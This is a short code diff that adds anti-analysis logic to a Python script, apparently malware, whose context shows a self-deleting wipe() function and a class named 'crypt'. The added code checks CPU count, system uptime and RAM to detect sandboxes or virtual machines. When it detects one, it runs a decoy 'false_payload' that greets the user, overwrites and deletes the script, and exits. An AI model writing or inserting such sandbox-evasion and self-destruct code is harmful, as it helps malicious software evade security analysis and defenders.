@@ -26,6 +26,21 @@ def wipe():
     open(sys.argv[0], "wb").write(b"\\x00" * os.path.getsize(sys.argv[0]))
     os.remove(sys.argv[0])
 
+def false_payload():
+    wipe()
+    print(f"Hello {input('What is you name?')}")
+
+if multiprocessing.cpu_count() < 3:
+    false_payload()
+    sys.exit()
+
+elif (time.time() - psutil.boot_time()) < 500:
+    false_payload()
+    sys.exit()
+
+elif (psutil.virtual_memory().total/1000000000) < 4:
+    false_payload()
+    sys.exit()
 
 
 class crypt:
